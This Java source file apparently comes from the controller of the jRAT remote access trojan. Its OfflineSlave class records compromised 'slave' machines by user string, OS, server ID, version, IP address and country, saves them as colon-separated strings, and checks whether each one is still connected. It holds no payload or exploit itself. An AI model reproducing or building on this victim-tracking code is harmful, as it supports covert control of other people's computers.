package se.jrat.client;


public class OfflineSlave {

	protected String userstring;
	protected String os;
	protected String serverid;
	protected String version;
	protected String ip;
	protected String country;
	protected long creation = System.currentTimeMillis();
	
	public OfflineSlave(AbstractSlave slave) {
		this.userstring = slave.formatUserString();
		this.os = slave.getOperatingSystem();
		this.serverid = slave.getServerID();
		this.version = slave.getVersion();
		this.ip = slave.getRawIP();
		this.country = slave.getCountry();
	}
	
	public OfflineSlave(String userstring, String longosname, String serverid, String version, String ip, String country) {
		this(userstring, longosname, serverid, version, ip, country, System.currentTimeMillis());
	}
	
	public OfflineSlave(String userstring, String longosname, String serverid, String version, String ip, String country, long creation) {
		this.userstring = userstring;
		this.os = longosname;
		this.serverid = serverid;
		this.version = version;
		this.ip = ip;
		this.country = country;
		this.creation = creation;
	}
	
	public static OfflineSlave fromString(String s) {
		String[] array = s.split(":");
		return new OfflineSlave(array[0], array[1], array[2], array[3], array[4], array[5], Long.parseLong(array[6]));
	}
	
	public static String toString(OfflineSlave slave) {
		StringBuilder sb = new StringBuilder();
		sb.append(slave.userstring + ":");
		sb.append(slave.os + ":");
		sb.append(slave.serverid + ":");
		sb.append(slave.version + ":");
		sb.append(slave.ip + ":");
		sb.append(slave.country + ":");
		sb.append(slave.creation);
		
		return sb.toString();
	}
	
	public String getString() {
		return OfflineSlave.toString(this);
	}

	public boolean isOnline() {
		for (AbstractSlave slave : Main.connections) {
			OfflineSlave os = new OfflineSlave(slave);
			
			if (os.equals(this)) {
				return true;
			}
		}
		
		return false;
	}
	
	public long getCreation() {
		return creation;
	}
	
	@Override
	public boolean equals(Object o) {
		if (o instanceof OfflineSlave) {
			OfflineSlave os = (OfflineSlave)o;
			
			return os.userstring.equals(this.userstring) && os.serverid.equals(this.serverid) && os.version.equals(this.version) && os.ip.equals(this.ip);
		} else {
			return false;
		}
	}

}
